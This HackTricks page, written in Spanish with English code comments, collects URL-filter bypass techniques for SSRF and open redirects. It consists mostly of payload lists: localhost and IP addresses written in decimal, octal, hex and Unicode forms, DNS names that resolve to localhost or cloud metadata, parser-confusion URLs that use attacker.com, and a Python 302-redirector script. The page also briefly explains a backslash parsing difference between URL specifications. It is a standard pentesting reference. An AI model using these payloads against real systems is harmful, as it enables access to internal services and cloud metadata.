# Evasi√≥n del Formato de URL

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan m√°s para poder arreglarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

### Localhost
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://‚ë†‚ë°‚ë¶.‚ì™.‚ì™.‚ì™

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127„ÄÇ0„ÄÇ0„ÄÇ1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
![](<../../.gitbook/assets/image (649) (1) (1).png>)

La **extensi√≥n de Burp** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) implementa bypasses de formato de IP.

### Analizador de Dominios
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker„ÄÇcom
‚í∂‚ìâ‚ìâ‚í∂‚í∏‚ìÄ‚í∫‚ì°.‚í∏‚ìû‚ìú
```

```
‚ë† ‚ë° ‚ë¢ ‚ë£ ‚ë§ ‚ë• ‚ë¶ ‚ëß ‚ë® ‚ë© ‚ë™ ‚ë´ ‚ë¨ ‚ë≠ ‚ëÆ ‚ëØ ‚ë∞ ‚ë± ‚ë≤ ‚ë≥ ‚ë¥ ‚ëµ ‚ë∂ ‚ë∑ ‚ë∏ ‚ëπ ‚ë∫ ‚ëª ‚ëº ‚ëΩ ‚ëæ
‚ëø ‚íÄ ‚íÅ ‚íÇ ‚íÉ ‚íÑ ‚íÖ ‚íÜ ‚íá ‚íà ‚íâ ‚íä ‚íã ‚íå ‚íç ‚íé ‚íè ‚íê ‚íë ‚íí ‚íì ‚íî ‚íï ‚íñ ‚íó
‚íò ‚íô ‚íö ‚íõ ‚íú ‚íù ‚íû ‚íü ‚í† ‚í° ‚í¢ ‚í£ ‚í§ ‚í• ‚í¶ ‚íß ‚í® ‚í© ‚í™ ‚í´ ‚í¨ ‚í≠ ‚íÆ ‚íØ ‚í∞
‚í± ‚í≤ ‚í≥ ‚í¥ ‚íµ ‚í∂ ‚í∑ ‚í∏ ‚íπ ‚í∫ ‚íª ‚íº ‚íΩ ‚íæ ‚íø ‚ìÄ ‚ìÅ ‚ìÇ ‚ìÉ ‚ìÑ ‚ìÖ ‚ìÜ ‚ìá ‚ìà ‚ìâ
‚ìä ‚ìã ‚ìå ‚ìç ‚ìé ‚ìè ‚ìê ‚ìë ‚ìí ‚ìì ‚ìî ‚ìï ‚ìñ ‚ìó ‚ìò ‚ìô ‚ìö ‚ìõ ‚ìú ‚ìù ‚ìû ‚ìü ‚ì† ‚ì° ‚ì¢
‚ì£ ‚ì§ ‚ì• ‚ì¶ ‚ìß ‚ì® ‚ì© ‚ì™ ‚ì´ ‚ì¨ ‚ì≠ ‚ìÆ ‚ìØ ‚ì∞ ‚ì± ‚ì≤ ‚ì≥ ‚ì¥ ‚ìµ ‚ì∂ ‚ì∑ ‚ì∏ ‚ìπ ‚ì∫ ‚ìª ‚ìº ‚ìΩ ‚ìæ ‚ìø
```
### Confusi√≥n de Dominio
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### Omisi√≥n de Rutas y Extensiones

Si se requiere que la URL termine en una ruta o una extensi√≥n, o debe contener una ruta, puedes intentar una de las siguientes omisiones:
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

La herramienta [**recollapse**](https://github.com/0xacb/recollapse) puede generar variaciones a partir de una entrada dada para intentar evadir la regex utilizada. Consulta [**este post**](https://0xacb.com/2022/11/21/recollapse/) tambi√©n para m√°s informaci√≥n.

### Evasi√≥n mediante redirecci√≥n

Es posible que el servidor est√© **filtrando la solicitud original** de un SSRF **pero no** una posible respuesta de **redirecci√≥n** a esa solicitud.\
Por ejemplo, un servidor vulnerable a SSRF a trav√©s de: `url=https://www.google.com/` podr√≠a estar **filtrando el par√°metro url**. Pero si usas un [servidor python para responder con un 302](https://pastebin.com/raw/ywAUhFrv) al lugar al que quieres redirigir, podr√≠as ser capaz de **acceder a direcciones IP filtradas** como 127.0.0.1 o incluso **protocolos filtrados** como gopher.\
[Consulta este informe.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## Trucos Explicados

### Truco del Backslash

En resumen, el _truco del backslash_ se basa en explotar una peque√±a diferencia entre dos especificaciones de "URL": el [Est√°ndar de URL de WHATWG](https://url.spec.whatwg.org/#url-parsing) y [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). RFC3986 es una especificaci√≥n gen√©rica y multiprop√≥sito para la sintaxis de _Identificadores de Recursos Uniformes_, mientras que el Est√°ndar de URL de WHATWG est√° espec√≠ficamente dirigido a la Web y a las URLs (que son un subconjunto de URIs). Los navegadores modernos implementan el Est√°ndar de URL de WHATWG.

Ambos describen una forma de analizar URI/URLs, con una ligera diferencia. La especificaci√≥n de WHATWG describe [un car√°cter extra](https://url.spec.whatwg.org/#authority-state), el `\`, que se comporta igual que `/`: termina el nombre de host y la autoridad y comienza la ruta de la URL.

![Las dos especificaciones analizan la misma URL de manera diferente](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### Otras Confusiones

![](<../../.gitbook/assets/image (629).png>)

imagen de [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan m√°s para poder arreglarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnol√≥gico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprende hacking de AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
